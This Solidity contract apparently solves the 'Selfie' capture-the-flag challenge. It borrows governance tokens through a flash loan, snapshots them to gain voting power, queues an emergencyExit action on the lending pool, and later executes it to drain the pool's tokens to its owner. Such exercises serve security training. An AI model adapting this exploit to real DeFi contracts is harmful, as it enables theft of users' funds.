// SPDX-License-Identifier: UNLICENSED

pragma solidity ^0.8.0;

import "@openzeppelin/contracts/interfaces/IERC3156FlashBorrower.sol";
import "../DamnValuableTokenSnapshot.sol";
import "../Attacker.sol";

interface ISelfiePool {
    function flashLoan(
        IERC3156FlashBorrower _receiver,
        address _token,
        uint256 _amount,
        bytes calldata _data
    ) external returns (bool);

    function maxFlashLoan(address _token) external view returns (uint256);


}

interface ISimpleGovernance {
    function queueAction(address target, uint128 value, bytes calldata data) external returns (uint256 actionId);
    function executeAction(uint256 actionId) external payable returns (bytes memory);
}

contract SelfieAttacker is Attacker, IERC3156FlashBorrower {

    DamnValuableTokenSnapshot private immutable _token;
    ISelfiePool private immutable _pool;
    ISimpleGovernance private immutable _governance;
    uint256 private actionId;
    bytes32 private constant CALLBACK_SUCCESS = keccak256("ERC3156FlashBorrower.onFlashLoan");

    constructor (address token, address pool, address governance) {
        _token = DamnValuableTokenSnapshot(token);
        _pool = ISelfiePool(pool);
        _governance = ISimpleGovernance(governance);
    }

    function startAttack() external override {
        address tokenAddress = address(_token);
        _pool.flashLoan(IERC3156FlashBorrower(address(this)), tokenAddress, _pool.maxFlashLoan(tokenAddress), "0x");
    }

    function onFlashLoan(
        address initiator,
        address token,
        uint256 amount,
        uint256 fee,
        bytes calldata data
    ) external override returns (bytes32) {
        _token.snapshot();
        actionId = _governance.queueAction(address(_pool), 0, abi.encodeWithSignature("emergencyExit(address)", initiator));
        _token.approve(address(_pool), amount + fee);
        return CALLBACK_SUCCESS;
    }

    function drainFunds() external {
        _governance.executeAction(actionId);
        _token.transfer(owner(), _token.balanceOf(address(this)));
    }

}